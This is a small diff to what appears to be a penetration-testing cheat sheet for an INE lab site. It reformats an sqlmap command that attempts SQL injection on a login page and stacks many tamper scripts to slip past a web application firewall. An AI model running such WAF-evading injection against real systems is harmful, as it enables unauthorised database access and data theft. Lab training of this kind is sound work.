@@ -161,9 +161,7 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 ## Attempts to bypass a WAF
 
 ```bash
-sqlmap -u 'http://demo.ine.local/index.php?page=login.php' -p page --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,
-equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,
-unionalltounion,unmagicquotes
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' -p page --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
 
 Additional parameters can be
